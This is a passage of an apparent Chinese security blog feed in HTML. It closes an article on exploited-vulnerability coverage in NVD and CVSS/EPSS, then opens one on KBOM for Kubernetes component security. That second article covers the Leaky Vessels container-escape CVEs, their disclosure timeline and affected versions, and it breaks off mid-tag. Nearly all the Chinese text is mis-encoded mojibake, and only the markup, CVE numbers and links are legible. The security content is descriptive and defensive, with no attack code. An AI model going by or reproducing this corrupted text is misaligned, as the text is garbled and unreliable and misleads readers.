·çš„ï¼Ÿ"></p><p>æˆ‘ä»¬å¸Œæœ›æ¢è®¨å·²çŸ¥è¢«åˆ©ç”¨æ¼æ´åœ¨ NIST NVD ä¸­çš„å½“å‰çŠ¶æ€ï¼Œä»¥è¯†åˆ«æ½œåœ¨çš„è¦†ç›–ç¼ºå£ã€‚åˆ†æå‘ç°ï¼š</p><ul><li>25.8% çš„æ¼æ´ä»åœ¨ç­‰å¾…æˆ–è¿›è¡Œåˆ†æï¼›</li><li>3.1% çš„æ¼æ´è¢«èµ‹äºˆæ–°çš„â€œå»¶æœŸï¼ˆDeferredï¼‰â€çŠ¶æ€ï¼›</li><li>69.2% çš„æ¼æ´å·²è¢«æ ‡è®°ä¸ºâ€œå·²åˆ†æï¼ˆAnalyzedï¼‰â€æˆ–â€œå·²ä¿®æ”¹ï¼ˆModifiedï¼‰â€ã€‚</li></ul><h2 id="0x07-è¯„åˆ†ç³»ç»Ÿåˆ†æ"><a href="#0x07-è¯„åˆ†ç³»ç»Ÿåˆ†æ" class="headerlink" title="0x07 è¯„åˆ†ç³»ç»Ÿåˆ†æ"></a>0x07 è¯„åˆ†ç³»ç»Ÿåˆ†æ</h2><p><img src="/image/691.webp" alt="å›¾ 6ï¼šå°† 2025 å¹´ç¬¬ä¸€å­£åº¦ KEV æ˜ å°„åˆ°è¯„åˆ†ç³»ç»Ÿçš„æƒ…å†µ"></p><p>åœ¨é€šè¿‡ CVSS å’Œ EPSS è¯„åˆ†è§’åº¦å®¡è§†æ–°å…´å¨èƒç”¨ä¾‹æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†æ¼æ´åˆ©ç”¨è¯æ®é¦–æ¬¡å…¬å¼€å½“å¤©çš„ EPSS å¾—åˆ†ï¼Œä»¥åŠå½“æ—¶å¯ç”¨çš„ä»»ä½• CVSS å¾—åˆ†ã€‚æˆ‘ä»¬å‘ç°ï¼Œå³ä¾¿æ¼æ´å·²çŸ¥è¢«åˆ©ç”¨ï¼Œå½“å¤© EPSS å¾—åˆ†å‡é«˜çš„æ¼æ´ä»ç„¶åªæœ‰æå°‘æ•°ã€‚è¿™è¡¨æ˜ï¼ŒEPSS æ›´åƒæ˜¯ä¸€ä¸ªæ»åæŒ‡æ ‡ï¼Œè€Œä¸æ˜¯é¢„æµ‹æ–°å…´å¨èƒçš„å·¥å…·ã€‚</p><p>ç»„ç»‡åœ¨åº”å¯¹æ–°å…´å¨èƒæ—¶ï¼Œåº”è°¨æ…ä¾èµ–æ¼æ´è¯„åˆ†ç³»ç»Ÿã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®‰å…¨å»ºè®¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäº KBOM ä¿éšœ Kubernetes ç»„ä»¶å®‰å…¨</title>
    <link href="/2025/03/13/%E5%9F%BA%E4%BA%8E-KBOM-%E4%BF%9D%E9%9A%9C-Kubernetes-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <url>/2025/03/13/%E5%9F%BA%E4%BA%8E-KBOM-%E4%BF%9D%E9%9A%9C-Kubernetes-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦"><a href="#æ‘˜è¦" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h2><p>æœ¬æ–‡æ—¨åœ¨æ¢è®¨ä¾›åº”é“¾å®‰å…¨ä¸äº‘åŸç”Ÿå®‰å…¨äº¤å‰é¢†åŸŸçš„ä¸€é¡¹ç ”ç©¶åŠåº”ç”¨â€”â€”KBOMï¼ˆKubernetes Bill of Materialsï¼‰ã€‚</p><p>åœ¨ Leaky Vessels æ¼æ´å¯¼è‡´å…¨çƒèŒƒå›´å†…å®¹å™¨é€ƒé€¸çš„èƒŒæ™¯ä¸‹ï¼Œæ–‡ç« é¦–å…ˆåˆ†æäº† Kubernetes æ¶æ„çš„æ¼”å˜åŠå…¶ç”Ÿæ€ç¯å¢ƒï¼Œè¿›è€Œæ­ç¤ºäº† Kubernetes ç»„ä»¶çš„å®‰å…¨ç°çŠ¶ã€‚</p><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæœ¬æ–‡ä»‹ç»äº† KBOM æ¦‚å¿µï¼Œæ—¨åœ¨æ¢è®¨ä¸šç•Œäººå£«ä¸ºäº†å¢å¼º Kubernetes ç»„ä»¶çš„å®‰å…¨æ€§æ‰€è¿›è¡Œçš„å°è¯•ã€‚</p><p>æ­¤å¤–ï¼Œæ–‡ç« è¿›ä¸€æ­¥æ·±å…¥æ¢è®¨äº† KBOM çš„æ ¸å¿ƒç†å¿µå’Œåº”ç”¨åœºæ™¯ï¼Œå¹¶è¯¦ç»†è®°å½•äº†ä¸ºå®ç° KBOM æ¼æ´æ‰«æå™¨æ‰€è¿›è¡Œçš„ç ”ç©¶å°è¯•ä¸æ¢ç´¢è¿‡ç¨‹ã€‚</p><blockquote><p>æœ¬æ–‡æ˜¯ç¬”è€…å‚åŠ ã€ŒFCIS 2024 ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§ä¼šã€çš„ã€Œå®æˆ˜æ”»é˜²ä¸ä¾›åº”é“¾å®‰å…¨é«˜å³°è®ºå›ã€ä¸­è®®é¢˜<a href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E5%9F%BA%E4%BA%8E%20KBOM%20%E4%BF%9D%E9%9A%9C%20Kubernetes%20%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8.pdf">ã€ŠåŸºäº KBOM ä¿éšœ Kubernetes ç»„ä»¶å®‰å…¨ã€‹</a>çš„æ–‡å­—ç‰ˆå†…å®¹ã€‚</p></blockquote><h2 id="å…³é”®è¯"><a href="#å…³é”®è¯" class="headerlink" title="å…³é”®è¯"></a>å…³é”®è¯</h2><p><strong>äº‘åŸç”Ÿå®‰å…¨</strong>ã€<strong>ä¾›åº”é“¾å®‰å…¨</strong>ã€<strong>Kubernetes ç»„ä»¶å®‰å…¨</strong>ã€<strong>KBOM</strong>ã€<strong>æ¼æ´æ‰«æ</strong></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>åœ¨å®¹å™¨å®‰å…¨é¢†åŸŸï¼Œrunc ç»„ä»¶çš„å®‰å…¨æ¼æ´å±¡æ¬¡æˆä¸ºç„¦ç‚¹ã€‚</p><p>å›æº¯åˆ° 2019 å¹´ï¼ŒCVE-2019-5736 æ¼æ´ï¼Œå³â€œRuncescapeâ€ï¼Œç”±æ³¢å…°ç ”ç©¶äººå‘˜ Adam Iwaniuk å’Œ Poplawski å‘ç°ï¼Œè¯¥æ¼æ´ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿè·å–å®¿ä¸»æœºçš„ root æƒé™ï¼Œå¼•å‘äº†å®‰å…¨ç¤¾åŒºçš„å¹¿æ³›å…³æ³¨ã€‚</p><p>å¦‚ä»Šï¼ŒCVE-2024-21626 æ¼æ´å†æ¬¡æ•²å“è­¦é’Ÿï¼Œå…¶å¹¿æ³›å½±å“æ¿€èµ·äº†æŠ€æœ¯ç•Œçš„çƒ­è®®ã€‚</p><p>éšç€ Kubernetes æ¶æ„çš„æŒç»­å‘å±•ï¼Œrunc ç­‰å…³é”®ç»„ä»¶çš„å®‰å…¨é—®é¢˜æ—¥ç›Šå‡¸æ˜¾ï¼Œå¼•å‘äº†å¯¹ Kubernetes ç»„ä»¶å®‰å…¨ç°çŠ¶çš„æ·±åˆ»æ€è€ƒã€‚</p><h2 id="ä¸€ã€èƒŒæ™¯"><a href="#ä¸€ã€èƒŒæ™¯" class="headerlink" title="ä¸€ã€èƒŒæ™¯"></a>ä¸€ã€èƒŒæ™¯</h2><h3 id="ï¼ˆä¸€ï¼‰Leaky-Vessels-æ¼æ´"><a href="#ï¼ˆä¸€ï¼‰Leaky-Vessels-æ¼æ´" class="headerlink" title="ï¼ˆä¸€ï¼‰Leaky Vessels æ¼æ´"></a>ï¼ˆä¸€ï¼‰Leaky Vessels æ¼æ´</h3><p>2023 å¹´ 11 æœˆ 20 æ—¥ï¼ŒSnyk çš„å®‰å…¨ç ”ç©¶å‘˜ Rory McNamara å‘ç°äº†æ ¸å¿ƒå®¹å™¨åŸºç¡€è®¾æ–½ç»„ä»¶ä¸­çš„å››ä¸ªå®‰å…¨æ¼æ´ï¼Œç»Ÿç§°ä¸º Leaky Vessels æ¼æ´ï¼Œå¦‚è¡¨ 1 æ‰€ç¤ºã€‚</p><p>è¡¨ 1ï¼šLeaky Vessels çš„æ¼æ´æ¦‚è§ˆ</p><table><thead><tr><th><strong>æ¼æ´ç¼–å·</strong></th><th><strong>å½±å“èŒƒå›´</strong></th><th><strong>æ¼æ´æ ‡é¢˜</strong></th><th><strong>å¨èƒç­‰çº§</strong></th><th><strong>CVSS åˆ†æ•°</strong></th></tr></thead><tbody><tr><td>CVE-2024-23651</td><td>Docker Buildkitâ‰¤v0.12.4</td><td>æ„å»ºé•œåƒæ—¶å› æ¡ä»¶ç«äº‰å¯¼è‡´å®¹å™¨é€ƒé€¸</td><td>é«˜å±</td><td>7.8</td></tr><tr><td>CVE-2024-23652</td><td>Docker Buildkitâ‰¤v0.12.4</td><td>æ„å»ºé•œåƒæ—¶æ¸…ç†é˜¶æ®µå¯èƒ½å¯¼è‡´ä»»æ„æ–‡ä»¶åˆ é™¤</td><td>è¶…å±</td><td>9.1</td></tr><tr><td>CVE-2024-23653</td><td>Docker Buildkitâ‰¤v0.12.4</td><td>æ„å»ºé•œåƒæ—¶ç¼ºå°‘ GRPC å®‰å…¨æ¨¡å¼çš„æƒé™æ£€æŸ¥å¯¼è‡´å®¹å™¨é€ƒé€¸</td><td>è¶…å±</td><td>9.8</td></tr><tr><td>CVE-2024-21626</td><td>v1.0.0-rc93â‰¤runc&lt;&#x3D;1.1.11</td><td>å› æ–‡ä»¶æè¿°ç¬¦æ³„æ¼å¯¼è‡´å®¹å™¨é€ƒé€¸</td><td>é«˜å±</td><td>8.6</td></tr></tbody></table><p>åœ¨å¯¹æ¼æ´è¿›è¡ŒéªŒè¯åï¼Œ<a href="https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/">Snyk è¿…é€Ÿå¯åŠ¨äº†è´Ÿè´£ä»»çš„æ¼æ´æŠ«éœ²æµç¨‹</a>ã€‚æ•´ä¸ªæµç¨‹ç»å†äº† 72 å¤©ï¼ŒæœŸé—´ Snyk è¿˜å‘å¸ƒäº†åŠ¨æ€å’Œé™æ€çš„æ£€æµ‹å·¥å…·ï¼Œä»¥ä¾›ç»„ç»‡è¿›è¡Œæ£€æµ‹ã€‚</p><p>ç›´è‡³ 2024 å¹´ 2 æœˆ 1 æ—¥ï¼Œå›½å†…å®‰å…¨å‚å•†æ‰å‘å¸ƒæ¼æ´é¢„è­¦ï¼Œå„è¡Œä¸šå…¬å¸éšå³å±•å¼€äº†åº”æ€¥å“åº”ã€‚</p><p>è¡¨ 2ï¼šLeaky Vessels çš„æ¼æ´æŠ«éœ²æµç¨‹</p><table><thead><tr><th><strong>æ—¶é—´èŠ‚ç‚¹</strong></th><th><strong>äº‹é¡¹</strong></th></tr></thead><tbody><tr><td>2023 å¹´ 11 æœˆ 20 æ—¥è¿™ä¸€å‘¨</td><td>æ¼æ´é¦–æ¬¡è¢«å‘ç°ï¼ŒRory McNamara å®Œæˆäº†æ¼æ´éªŒè¯å¹¶æ„å»ºäº† PoC</td></tr><tr><td>2023 å¹´ 12 æœˆ 11 æ—¥</td><td>å°†æ¼æ´è¯¦æƒ…æŠ¥å‘Šç»™ Dockerï¼ŒDocker å½“æ—¥ç¡®è®¤äº†æ¼æ´</td></tr><tr><td>2023 å¹´ 12 æœˆ 12 æ—¥</td><td>Snyk æ”¶åˆ° Docker è¯·æ±‚ï¼Œå°† WORKDIR æ¼æ´è½¬äº¤ runcï¼Œè®¤ä¸ºè¯¥æ¼æ´å±äº runc</td></tr><tr><td>2023 å¹´ 12 æœˆ 13 æ—¥</td><td>Rory è¢«æ·»åŠ ä¸º Docker&#x2F;Buildkit ä»»æ„åˆ é™¤å’Œ grpc æ¼æ´çš„ Github å®‰å…¨å…¬å‘Šåˆä½œè€…</td></tr><tr><td>2023 å¹´ 12 æœˆ 19 æ—¥</td><td>Rory è¢«æ·»åŠ ä¸º runc çš„ WORKDIR æ¼æ´çš„ Github å®‰å…¨å…¬å‘Šåˆä½œè€…</td></tr><tr><td>2023 å¹´ 12 æœˆ 20 æ—¥</td><td>Rory è¢«æ·»åŠ ä¸º Docker &#x2F; Buildkit ç¼“å­˜ç«äº‰æ¼æ´çš„ Github å®‰å…¨å…¬å‘Šåˆä½œè€…</td></tr><tr><td>2024 å¹´ 1 æœˆ 2 æ—¥</td><td>runc è¢«åˆ†é… CVE ç¼–å·</td></tr><tr><td>2024 å¹´ 1 æœˆ 17 æ—¥</td><td>runc é€šè¿‡å®‰å…¨é‚®ä»¶åˆ—è¡¨å‘å¸ƒä¿®å¤è¡¥ä¸å…¬å‘Šï¼Œå¹¶è¦æ±‚åœ¨ 2024 å¹´ 1 æœˆ 31 æ—¥å‰åº”ç”¨è¡¥ä¸</td></tr><tr><td>2024 å¹´ 1 æœˆ 24 æ—¥</td><td>Docker è¢« Github åˆ†é… CVE ç¼–å·</td></tr><tr><td>2024 å¹´ 1 æœˆ 31 æ—¥</td><td>Leaky Vessel çš„å››ä¸ªæ¼æ´å…¬å¼€ï¼ŒSnyk å¼€æºäº†åŠ¨æ€æ£€æµ‹å·¥å…· <a href="https://www.github.com/snyk/leaky-vessels-dynamic-detector">leaky-vessels-dynamic-detector</a> å’Œé™æ€æ£€æµ‹å·¥å…·  <a href="https://github.com/snyk/leaky-vessels-static-detector">leaky-vessels-static-detector</a>ã€‚</td></tr></tbody></table><h3 id="ï¼ˆäºŒï¼‰CVE-2024-21626-æ¼æ´"><a href="#ï¼ˆäºŒï¼‰CVE-2024-21626-æ¼æ´" class="headerlink" title="ï¼ˆäºŒï¼‰CVE-2024-21626 æ¼æ´"></a>ï¼ˆäºŒï¼‰CVE-2024-21626 æ¼æ´</h3><p>Leaky Vessels æ¼æ´ä¸­ï¼ŒCVE-2024-21626 çš„å½±å“èŒƒå›´æœ€ä¸ºå¹¿æ³›ã€‚</p><p>åœ¨ runc 1.11 åŠæ›´æ—©çš„ç‰ˆæœ¬ä¸­ï¼Œç”±äºå†…éƒ¨æ–‡ä»¶æè¿°ç¬¦æ³„æ¼çš„é—®é¢˜ï¼Œæ”»å‡»è€…å¯ä»¥è®©æ–°ç”Ÿæˆçš„å®¹å™¨è¿›ç¨‹åœ¨å®¿ä¸»æ–‡ä»¶ç³»ç»Ÿå‘½åç©ºé—´ä¸­æ‹¥æœ‰å·¥ä½œç›®å½•ï¼Œä»è€Œå…è®¸é€šè¿‡è®¿é—®å®¿ä¸»æ–‡ä»¶ç³»ç»Ÿå®ç°å®¹å™¨é€ƒé€¸ã€‚</p><p>æ­¤å¤–ï¼Œæ¶æ„é•œåƒä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ”»å‡»ï¼Œä»¤å®¹å™¨è¿›ç¨‹é€šè¿‡ runc run è®¿é—®ä¸»æœºæ–‡ä»¶ç³»ç»Ÿã€‚</p><p>è¡¨ 3ï¼šå— CVE-2024-21626 å½±å“çš„å¸¸è§çš„ç»„ä»¶</p><table><thead><tr><th><strong>å½±å“ç»„ä»¶</strong></th><th><strong>å½±å“ç‰ˆæœ¬</strong></th><th><strong>å·²ä¿®å¤ç‰ˆæœ¬</strong></th></tr></thead><tbody><tr><td>runc</td><td>â‰¥v1.0.0-rc93ï¼Œâ‰¤v1.1.11</td><td>v1.1.12</td></tr><tr><td>conatinerd</td><td>â‰¥1.4.7ï¼Œâ‰¤1.6.27 â‰¥1.7.0ï¼Œâ‰¤1.7.12</td><td>v1.6.28 v1.7.13</td></tr><tr><td>BuildKit</td><td>â‰¤0.12.4</td><td>v0.12.5</td></tr><tr><td>Moby (Docker Engine)</td><td>â‰¤v25.0.1 â‰¤v24.0.8</td><td>v25.0.2 v24.0.9</td></tr><tr><td>Docker Desktop</td><td>â‰¤4.27.0</td><td>4.27.1</td></tr><tr><td>containerd</td><td>â‰¤1.6.27 â‰¤1.7.12</td><td>1.6.28 1.7.13</td></tr></tbody></table><p>è¿™äº›æ”»å‡»çš„ä¸åŒå½¢å¼éƒ½å¯ä»¥ç”¨æ¥è¦†ç›–å®¿ä¸»æœºä¸Šçš„ä¸€äº›ç‰¹å®šç¨‹åºæ–‡ä»¶ï¼Œä»¥å®ç°ä»å®¹å™¨å†…éƒ¨å®Œå…¨é€ƒé€¸åˆ°å®¿ä¸»æœºã€‚</p><p>æ® Dark Reading æŠ¥é“ï¼Œ<a href="https://www.darkreading.com/cloud-security/leaky-vessel-cloud-bugs-container-escapes-globally">Leaky Vessels æ¼æ´äº‹ä»¶è§¦å‘äº†å…¨çƒèŒƒå›´å†…çš„å®¹å™¨é€ƒé€¸ç°è±¡</a>ï¼›Wiz æ¨æµ‹ï¼Œ<a href="https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities">è‡³å°‘æœ‰ 80% çš„äº‘ç¯å¢ƒå¯èƒ½ä¼šå—åˆ°è¯¥æ¼æ´çš„å½±å“</a>ï¼›è€Œé˜¿é‡Œäº‘åŸºäºå…¶åºå¤§çš„æ•°æ®èµ„æºï¼Œ<a href="https://avd.aliyun.com/detail?id=CVE-2024-21626">è¯„ä¼°å‡ºå…¨ç½‘è‡³å°‘æœ‰ 100,000 ä¸ªåº”ç”¨å¯èƒ½é­å—è¯¥æ¼æ´çš„å½±å“</a>ã€‚</p><p>é‰´äº runc æ˜¯ä¸€ä¸ªåº•å±‚çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œèƒ½å¤ŸåŸºäº Linux å†…æ ¸åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ï¼Œæˆä¸ºäº†å‡ ä¹æ‰€æœ‰çš„å®¹å™¨å¼•æ“è°ƒç”¨çš„ç¬¬ä¸‰æ–¹åº“ï¼Œå› æ­¤è¯¥æ¼æ´çš„å½±å“èŒƒå›´æ‰©å±•è‡³åŒ…æ‹¬ Containerdã€Docker Engine ç­‰ä¼—å¤šåŸºäº runc ç‰¹å®šç‰ˆæœ¬æ„å»ºçš„ä¸‹æ¸¸ç»„ä»¶åŠè½¯ä»¶ã€‚</p><p><img src="/image/674.webp" alt="å›¾ 1ï¼šrunc ç»„ä»¶çš„ä¸Šä¸‹æ¸¸å…³ç³»"></p><h3 id="ï¼ˆä¸‰ï¼‰æ€»ç»“"><a href="#ï¼ˆä¸‰ï¼‰æ€»ç»“" class="headerlink" title="ï¼ˆä¸‰ï¼‰æ€»ç»“"></a>ï¼ˆä¸‰ï¼‰æ€»ç»“</h3><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œrunc å¹¶éé¦–æ¬¡è¢«æŠ«éœ²å‡ºå½±å“èŒƒå›´å¦‚æ­¤å¹¿æ³›çš„æ¼æ´äº†ã€‚</p><p>2019 å¹´ 2 æœˆ 11 æ—¥ï¼Œæ³¢å…°ç ”ç©¶äººå‘˜ Adam Iwaniuk å’Œ Poplawski åœ¨ç ”ç©¶ namespace æ²™ç›’æ—¶ï¼Œæ— æ„é—´åœ¨ runc ä¸­å‘ç°äº† CVE-2019-5736 æ¼æ´ï¼Œå¹¶å‘½åä¸º <a href="https://thenewstack.io/what-you-need-to-know-about-the-runc-container-escape-vulnerability/">Runcescape</a>ï¼Œè¯¥æ¼æ´åŒæ ·å…è®¸æ”»å‡»è€…è·å–å®¿ä¸»æœºçš„ root è®¿é—®æƒé™ã€‚</p><p>ä¸ CVE-2019-5736 æ¼æ´ç±»ä¼¼ï¼ŒCVE-2024-21626 æ¼æ´åŒæ ·å¼•èµ·äº†å¹¿æ³›çš„å…³æ³¨ï¼Œä¼—å¤šæŠ€æœ¯åšå®¢å’Œå•†ä¸šå…¬å¸å‡å¯¹è¯¥æ¼æ´è¿›è¡Œäº†ä¸“é¢˜è®¨è®ºã€‚</p><p>ä¸åŒçš„æ˜¯ï¼Œéšç€ Kubernetes æ¶æ„çš„ä¸æ–­æ¼”è¿›ï¼Œrunc ç­‰ç»„ä»¶çš„å®‰å…¨æ¼æ´äº‹ä»¶å¼•å‘äº†æˆ‘ä»¬å¯¹ Kubernetes ç»„ä»¶å®‰å…¨ç°çŠ¶çš„æ‹…å¿§ã€‚</p><h2 id="äºŒã€Kubernetes-ç»„ä»¶å®‰å…¨ç°çŠ¶"><a href="#äºŒã€Kubernetes-ç»„ä»¶å®‰å…¨ç°çŠ¶" class="headerlink" title="äºŒã€Kubernetes ç»„ä»¶å®‰å…¨ç°çŠ¶"></a>äºŒã€Kubernetes ç»„ä»¶å®‰å…¨ç°çŠ¶</h2><h3 id="ï¼ˆä¸€ï¼‰Kubernetes-æ¶æ„åŠç”Ÿæ€"><a href="#ï¼ˆä¸€ï¼‰Kubernetes-æ¶æ„åŠç”Ÿæ€" class="headerlink" title="ï¼ˆä¸€ï¼‰Kubernetes æ¶æ„åŠç”Ÿæ€"></a>ï¼ˆä¸€ï¼‰Kubernetes æ¶æ„åŠç”Ÿæ€</h3><p>å®¹å™¨çš„ç”Ÿæ€ç³»ç»Ÿç”±æ–°å…´æŠ€æœ¯ã€ä¼—å¤šä¸“ä¸šæœ¯è¯­ä»¥åŠç›¸äº’ç«äº‰çš„å¤§å‹ä¼ä¸šç»„æˆã€‚</p><p>è¿™äº›ä¼ä¸šå¶å°”ä¼šæš‚åœç«äº‰ï¼Œå…±åŒå»ºç«‹å¦‚ CRIã€CNI ä»¥åŠ CSI ç­‰æ ‡å‡†ï¼Œä»¥ä¿ƒè¿›æ•´ä¸ªç”Ÿæ€ç³»ç»Ÿçš„äº’æ“ä½œæ€§ï¼Œä»è€Œå…è®¸ç»„ç»‡åœ¨ä¸åŒçš„å¹³å°å’Œæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œå®¹å™¨ï¼Œå‡å°‘å¯¹å•ä¸€é¡¹ç›®çš„ä¾èµ–ã€‚</p><p>Kubernetes äº 2022 å¹´ 5 æœˆ 4 æ—¥å‘å¸ƒäº† <a href="https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.24.md#dockershim-removed-from-kubelet">v1.24.0 ç‰ˆæœ¬</a>ï¼Œåœ¨è¯¥ç‰ˆæœ¬ä¸­å·²å½»åº•ç§»é™¤äº† dockershim æ’ä»¶ï¼Œè¿™æ ‡å¿—ç€ Kubernetes å·²æ­£å¼ç»“æŸå¯¹ Docker å®¹å™¨è¿è¡Œæ—¶çš„åŸç”Ÿæ”¯æŒäº†ã€‚</p><p><img src="/image/675.webp" alt="å›¾ 2ï¼šKubernetes v1.24.0 å·²å®Œå…¨ç§»é™¤äº† dockershim"></p><p>éšç€æ—¶é—´çš„æ¨ç§»ï¼ŒKubernetes å…è®¸æ¥å…¥å¤šç§è¿è¡Œæ—¶ç»„ä»¶ã€ç½‘ç»œç»„ä»¶å’Œå­˜å‚¨ç»„ä»¶ï¼Œé€æ­¥æ¼”å˜æˆä¸€ä¸ªä¸å®¹å™¨æ— å…³çš„ç¼–æ’å¹³å°äº†ã€‚</p><p>ä¼´éšç€æ¶æ„çš„å˜åŒ–ï¼ŒKubernetes çš„ç¬¬ä¸‰æ–¹ç”Ÿæ€ç³»ç»Ÿä¹Ÿå¾—åˆ°äº†è“¬å‹ƒçš„å‘å±•ã€‚ç»„ç»‡å¯æ ¹æ® CNCF å‘å¸ƒçš„<a href="https://landscape.cncf.io/">äº‘åŸç”Ÿè“å›¾</a>ï¼ŒæŒ‰éœ€é€‰æ‹©é€‚åˆçš„ç»„ä»¶ã€æ’ä»¶å’Œå·¥å…·ã€‚</p><p><img src="/image/676.webp" alt="å›¾ 3ï¼šäº‘åŸç”Ÿè“å›¾"></p><p>ç„¶è€Œï¼Œä¸°å¯Œçš„é€‰æ‹©ä¹Ÿå¸¦æ¥äº†ç›¸åº”çš„é£é™©ã€‚æˆ‘ä»¬å¯¹äº‘åŸç”Ÿè“å›¾ä¸­æ‰€æåŠçš„éƒ¨åˆ†ç»„ä»¶çš„å®‰å…¨å…¬å‘Šè¿›è¡Œäº†åˆæ­¥çš„<a href="https://github.com/miao2sec/cloud-native-sec-vuln">é‡‡é›†</a>ï¼Œå‘ç°è¿‘å¹´æ¥äº‘åŸç”Ÿç»„ä»¶çš„æ¼æ´æ•°é‡å‘ˆç°å‡ºä¸Šå‡çš„è¶‹åŠ¿ï¼Œä¸”è¶Šä¸ºé€šç”¨çš„ç»„ä»¶ï¼Œå…¶æ¼æ´æ•°é‡å¢é•¿è¶Šè¿…é€Ÿã€‚</p><h3 id="ï¼ˆäºŒï¼‰Kubernetes-å¨èƒå»ºæ¨¡"><a href="#ï¼ˆäºŒï¼‰Kubernetes-å¨èƒå»ºæ¨¡" class="headerlink" title="ï¼ˆäºŒï¼‰Kubernetes å¨èƒå»ºæ¨¡"></a>ï¼ˆäºŒï¼‰Kubernetes å¨èƒå»ºæ¨¡</h3><p>åœ¨ Kubernetes çš„å¨èƒå»ºæ¨¡ä¸­ï¼Œç»„ä»¶å®‰å…¨å æ®ç€æ ¸å¿ƒåœ°ä½ã€‚</p><ul><li><p>åœ¨ CNCF æå‡ºçš„<a href="https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/securing-the-4-cs-of-cloud-native-systems-cloud-cluster-container-and-code">äº‘åŸç”Ÿå®‰å…¨ 4C æ¨¡å‹</a>ä¸­ï¼Œé›†ç¾¤ç»„ä»¶å®‰å…¨è¢«ç§°ä¸ºé›†ç¾¤ï¼ˆClusterï¼‰å®‰å…¨çš„ä¸‰å¤§è¦ç´ ä¹‹ä¸€ï¼›</p></li><li><p>åœ¨å¾®è½¯æ„å»ºçš„ <a href="https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/">Kubernetes ATT&amp;CK å¨èƒçŸ©é˜µ</a>ä¸­ï¼Œå®¹å™¨é€ƒé€¸æŠ€æœ¯çš„ä¸»è¦å½±å“å› ç´ ä¸ºè¿è¡Œæ—¶ç»„ä»¶æœ¬èº«çš„æ¼æ´ï¼›</p></li><li><p>OWASP åœ¨å‘å¸ƒ <a href="https://owasp.org/www-project-kubernetes-top-ten/">Kubernetes Top 10</a> æ—¶ï¼Œå°†â€œè¿‡æ—¶ä¸”æ˜“å—æ”»å‡»çš„ Kubernetes ç»„ä»¶â€åˆ—ä¸ºåå¤§å®‰å…¨é£é™©ä¹‹ä¸€ï¼›</p></li><li><p>CNCF é‡‘èæœåŠ¡ç”¨æˆ·ç»„åœ¨é‡‡ç”¨ <a href="https://github.com/cncf/financial-user-group/tree/main/projects/k8s-threat-model">STRIDE æ–¹æ³•</a>å¯¹ Kubernetes è¿›è¡Œå¨èƒå»ºæ¨¡æ—¶ï¼Œå…ˆå¯¹ Kubernetes ç»„ä»¶è¿›è¡Œå®¡æŸ¥ï¼Œå†è¯†åˆ«å¹³å°å†…ä¿¡ä»»è¾¹ç•Œå¤„çš„æ½œåœ¨å®‰å…¨é—®é¢˜ã€‚</p></li></ul><p><img src="/image/677.webp" alt="å›¾ 4ï¼šKubernetes å¨èƒå»ºæ¨¡"></p><h3 id="ï¼ˆä¸‰ï¼‰æ€»ç»“-1"><a href="#ï¼ˆä¸‰ï¼‰æ€»ç»“-1" class="headerlink" title="ï¼ˆä¸‰ï¼‰æ€»ç»“"></a>ï¼ˆä¸‰ï¼‰æ€»ç»“</h3><p>éšç€ Kubernetes æ¶æ„çš„æ¼”å˜ä»¥åŠç”Ÿæ€ç³»ç»Ÿçš„è“¬å‹ƒå‘å±•ï¼Œé›†ç¾¤ç»„ä»¶çš„å®‰å…¨å—åˆ°äº†ä¸šç•Œçš„å¹¿æ³›å…³æ³¨ã€‚</p><p>ç„¶è€Œï¼Œä¸å•ä¸ªå®¹å™¨å®‰å…¨é˜²æŠ¤çš„åº”ç”¨å®è·µç›¸æ¯”ï¼Œå®¹å™¨ç¼–æ’æ•´ä½“å®‰å…¨é˜²æŠ¤ä»ç„¶ç¼ºä¹æœ‰æ•ˆçš„è½åœ°æ–¹æ¡ˆã€‚</p><p>æ­¤å¤–ï¼Œé’ˆå¯¹ Kubernetes çš„å®‰å…¨é˜²æŠ¤æªæ–½ï¼Œä¹Ÿä¸»è¦ä¾èµ–äºé…ç½®æ‰«æä»¥åŠå®¹å™¨é•œåƒæ¼æ´æ£€æµ‹ã€‚</p><p><strong>æ­¤åï¼Œä¸šç•Œå¯¹äº Kubernetes ç»„ä»¶å®‰å…¨çš„å…³æ³¨ç›¸å¯¹è¾ƒå°‘ï¼Œä¸”å‘ˆç°å‡ºä¸€å®šç¨‹åº¦çš„æ»åã€‚</strong></p><h2 id="ä¸‰ã€Kubernetes-ç‰©æ–™æ¸…å•ï¼ˆKBOMï¼‰"><a href="#ä¸‰ã€Kubernetes-ç‰©æ–™æ¸…å•ï¼ˆKBOMï¼‰" class="headerlink" title="ä¸‰ã€Kubernetes ç‰©æ–™æ¸…å•ï¼ˆKBOMï¼‰"></a>ä¸‰ã€Kubernetes ç‰©æ–™æ¸…å•ï¼ˆKBOMï¼‰</h2><h3 id="ï¼ˆä¸€ï¼‰é¦–ä¸ª-KBOM-æ ‡å‡†é¢å¸ƒ"><a href="#ï¼ˆä¸€ï¼‰é¦–ä¸ª-KBOM-æ ‡å‡†é¢å¸ƒ" class="headerlink" 